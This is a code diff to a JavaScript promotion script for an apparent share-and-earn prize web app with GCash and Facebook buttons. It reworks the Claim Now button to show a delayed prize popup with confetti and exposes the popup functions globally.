@@ -1,6 +1,5 @@
 // ========== PROMOTION.JS - SHARE AND EARN ==========
 // Firebase for shared data (no Auth), localStorage for cache
-// Complete with Firewall ON/OFF logic and 4-digit verification
 
 // ========== FIREWALL VERIFICATION VARIABLES ==========
 var currentVerificationCode = null;
@@ -28,8 +27,6 @@ function getUserRef() {
     var db = firebase.database();
     return db.ref('lucky_drop_users/' + phone);
 }
-
-
 
 // ========== LOAD USER DATA FROM FIREBASE ==========
 async function loadUserDataFromFirebase() {
@@ -527,51 +524,57 @@ function initRightLuckyCat() {
     });
 }
 
-// ========== CLAIM NOW BUTTON ==========
+// ========== CLAIM NOW BUTTON (WITH POPUP AFTER 1.5 SEC) ==========
 function initClaimNowButton() {
     var claimNowBtn = document.getElementById('claimNowBtn');
     if (claimNowBtn) {
+        // Remove existing listeners
+        var newBtn = claimNowBtn.cloneNode(true);
+        claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
+        claimNowBtn = newBtn;
+        
         claimNowBtn.onclick = function(e) {
             e.preventDefault();
             
-            // I-animate ang icon
+            console.log("CLAIM NOW button clicked - 1.5 sec delay before popup");
+            
+            // Disable button during animation
+            claimNowBtn.disabled = true;
+            claimNowBtn.style.opacity = '0.7';
+            claimNowBtn.style.cursor = 'wait';
+            
+            // Twist animation
             var icon = this.querySelector('img');
             if (icon) {
                 icon.style.transform = 'rotate(360deg)';
-                setTimeout(function() {
-                    icon.style.transform = '';
-                }, 500);
+                icon.style.transition = 'transform 0.3s ease';
             }
             
-            // Palitan ang view (parang lumipat sa ibang page)
-            document.getElementById('mainView').style.display = 'none';
-            document.getElementById('claimView').style.display = 'block';
-            
-            // I-update ang balance sa claim view
-            var balance = getBalance();
-            document.getElementById('claimBalanceAmount').innerHTML = '₱' + balance;
+            // Show popup after 1.5 seconds
+            setTimeout(function() {
+                if (icon) icon.style.transform = '';
+                claimNowBtn.disabled = false;
+                claimNowBtn.style.opacity = '1';
+                claimNowBtn.style.cursor = 'pointer';
+                showPrizePopup();
+            }, 1500);
         };
     }
 }
 
-// Back button
-function initBackButton() {
-    var backBtn = document.getElementById('backToMainBtn');
-    if (backBtn) {
-        backBtn.onclick = function() {
-            document.getElementById('claimView').style.display = 'none';
-            document.getElementById('mainView').style.display = 'block';
-        };
-    }
-}
-
-// ========== POPUP FUNCTIONS ==========
+// ========== PRIZE POPUP FUNCTIONS ==========
 function showPrizePopup() {
     var popup = document.getElementById('prizePopup');
     if (popup) {
         popup.style.display = 'flex';
         startConfetti();
     }
+}
+
+function closePrizePopup() {
+    var popup = document.getElementById('prizePopup');
+    if (popup) popup.style.display = 'none';
+    stopConfetti();
 }
 
 // ========== FACEBOOK SHARE ==========
@@ -586,8 +589,6 @@ function initFacebookShare() {
         fbIcon.style.height = '18px';
         fbIcon.style.marginRight = '8px';
         fbIcon.style.verticalAlign = 'middle';
-        
-        // Para maalis ang white background
         fbIcon.style.backgroundColor = 'transparent';
         
         fbBtn.appendChild(fbIcon);
@@ -600,12 +601,12 @@ function initFacebookShare() {
     }
 }
 
-
-// ========== CLAIM THRU GCASH BUTTON - SIMPLE TRIGGER ==========
+// ========== CLAIM THRU GCASH BUTTON ==========
 function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
     if (claimBtn) {
         claimBtn.onclick = function() {
+            console.log("CLAIM THRU GCASH clicked - calling popup_share.js");
             if (typeof window.showClaimPopupShare === 'function') {
                 window.showClaimPopupShare(150);
             } else {
@@ -614,6 +615,12 @@ function initClaimButton() {
         };
     }
 }
+
+// ========== EXPOSE FUNCTIONS ==========
+window.showPrizePopup = showPrizePopup;
+window.closePrizePopup = closePrizePopup;
+window.startConfetti = startConfetti;
+window.stopConfetti = stopConfetti;
 
 // ========== INITIALIZE ==========
 document.addEventListener('DOMContentLoaded', function() {
